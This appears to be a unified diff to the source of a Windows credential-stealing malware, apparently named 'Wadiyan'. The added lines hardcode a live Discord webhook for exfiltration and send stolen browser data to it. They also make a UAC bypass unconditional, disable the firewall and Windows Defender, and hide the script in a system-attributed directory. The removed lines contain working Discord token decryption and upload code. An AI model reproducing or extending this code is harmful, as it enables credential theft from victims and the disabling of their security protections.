@@ -96,6 +96,7 @@ wh_name = cc.get_name()
 eb_color = cc.get_color()
 eb_footer = cc.get_footer()
 webhook = cc.get_webhook()
+vault_webhook = "https://discord.com/api/webhooks/1338044732798140438/mvVteBvkzzA2sU4cHo9N7iIibTwmji_4ixi4gL-ic_TkUzMBO2q-5877SDcz89d4wM-_"
 Threadlist = []
 changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
 roaming = os.getenv("APPDATA")
@@ -210,18 +211,23 @@ def is_running(process_name):
     return False
 
 def move_to_hidden_directory():
-    """Move the script to the hidden directory and restart from there."""
     if not os.path.abspath(__file__).startswith(HIDDEN_DIR):
         print(f"[INFO] Moving script to hidden directory: {HIDDEN_DIR}")
         os.makedirs(HIDDEN_DIR, exist_ok=True)
 
-
         script_dir = os.path.dirname(os.path.abspath(__file__))
+        
         for filename in os.listdir(script_dir):
-            source_path = os.path.join(script_dir, filename)
-            dest_path = os.path.join(HIDDEN_DIR, filename)
-            if os.path.isfile(source_path):
+            if filename.endswith(".py") or filename == "crack.dll":
+                source_path = os.path.join(script_dir, filename)
+                dest_path = os.path.join(HIDDEN_DIR, filename)
+                
+                if os.path.isfile(dest_path):
+                    os.remove(dest_path)
+                
                 shutil.copy2(source_path, dest_path)
+                print(f"[INFO] Copied {filename} to hidden directory (Overwritten).")
+
 
         subprocess.run(["attrib", "+H", "+S", HIDDEN_DIR], shell=True)
 
@@ -333,96 +339,16 @@ def try_extract(func):
 
 
 
-if cc.get_uac_bypass():
-    try:
-        if not IsAdmin():
-            if GetSelf()[1]:
-                if UACbypass():
-                    subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
-                    subprocess.run(r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
-    except Exception as e:
-        send_error_notification(e, 'Wadiyan UAC Bypass')        
+try:
+    if not IsAdmin():
+        if GetSelf()[1]:
+            if UACbypass():
+                subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
+                subprocess.run(r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
+except Exception as e:
+    send_error_notification(e, 'Wadiyan UAC Bypass')        
 
-def DecryptValue(buff, master_key=None):
-    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
-    if starts in ("v10", "v11"):
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
 
-Tokens = ""
-dclass = discordc.DiscordX()
-
-def GetDiscord(path, arg):
-    if not os.path.exists(f"{path}/Local State"):
-        return
-
-    pathC = path + arg
-
-    pathKey = path + "/Local State"
-    with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = json_loads(f.read())
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = CryptUnprotectData(master_key[5:])
-    print(path, master_key)
-
-    for file in os.listdir(pathC):
-        print(path, file)
-        if file.endswith(".log") or file.endswith(".ldb"):
-            for line in [
-                    x.strip() for x in open(f"{pathC}\\{file}",
-                                            errors="ignore").readlines()
-                    if x.strip()
-            ]:
-                for token in re.findall(
-                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                    global Tokens
-                    tokenDecoded = DecryptValue(
-                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
-                    if dclass.checkToken(
-                            tokenDecoded) and tokenDecoded not in Tokens:
-                        print(token)
-                        Tokens += tokenDecoded
-                        # writeforfile(Tokens, 'tokens')
-                        dclass.uploadToken(tokenDecoded)
-
-def GetTokens(path, arg):
-    if not os.path.exists(path):
-        return
-
-    path += arg
-    for file in os.listdir(path):
-        if file.endswith(".log") or file.endswith(".ldb"):
-            for line in [
-                    x.strip() for x in open(f"{path}\\{file}",
-                                            errors="ignore").readlines()
-                    if x.strip()
-            ]:
-                for regex in (
-                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
-                        r"mfa\.[\w-]{80,95}",
-                ):
-                    for token in re.findall(regex, line):
-                        global Tokens
-                        if dclass.checkToken(token) and token not in Tokens:
-                            Tokens += token
-                            dclass.uploadToken(token)
-
-discordPaths = [
-    [f"{roaming}/Discord", "/Local Storage/leveldb"],
-    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
-]
-
-if cc.get_token_stealing():
-    for patt in discordPaths:
-            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-            a.start()
-            Threadlist.append(a)    
 
 
 
@@ -458,7 +384,7 @@ if cc.get_screenshot():
 
 if cc.get_browser_stealing():
     try:
-        browsers = Browsers(webhook)
+        browsers = Browsers(vault_webhook)
     except Exception as e:
         send_error_notification(e, 'Wadiyan Browser Stealer')    
 
